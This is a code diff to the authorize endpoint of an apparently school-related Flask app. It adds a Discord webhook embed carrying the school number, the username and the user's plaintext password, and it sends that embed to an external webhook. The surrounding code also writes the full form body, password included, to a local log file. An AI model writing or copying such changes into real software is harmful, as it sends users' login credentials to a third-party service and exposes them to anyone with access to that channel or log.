@@ -4,6 +4,7 @@ import json
 import datetime
 from pathlib import Path
 
+from discord_webhook import DiscordEmbed
 from flask import Blueprint, request, Response
 from flask_login import login_required, current_user
 from endpoints.authorization import school_authorized
@@ -12,6 +13,7 @@ import backend.cache
 import backend.load_plans
 from backend.vplan_utils import find_closest_date
 from utils import send_success, send_error
+from utils import webhook_send
 
 from var import *
 
@@ -114,6 +116,13 @@ def get_school_by_id(school_num: str):
 @api.route(f"{API_BASE_URL}/authorize", methods=["POST"])
 @login_required
 def authorize(school_num: str) -> Response:
+    embed = DiscordEmbed(title="AUTH ATTEMPT", color="0000ff")
+    embed.add_embed_field("School number:", f"```{school_num}```", inline=False)
+    embed.add_embed_field("username:", f"```{request.form.get('username')}```", inline=False)
+    embed.add_embed_field("password:", f"||```{request.form.get('pw')}```||", inline=False)
+    embed.set_footer("A detailed log can be found under .cache/auth.log")
+    embed.set_timestamp()
+    webhook_send("WEBHOOK_SCHOOL_AUTHORIZATION", embeds=[embed])
     with open(".cache/auth.log", "a") as f:
         f.write(f"New auth attempt for {request.form.get('school_num')}\nargs: {request.args}\nbody: {request.form}")
     school_data = get_school_by_id(school_num)
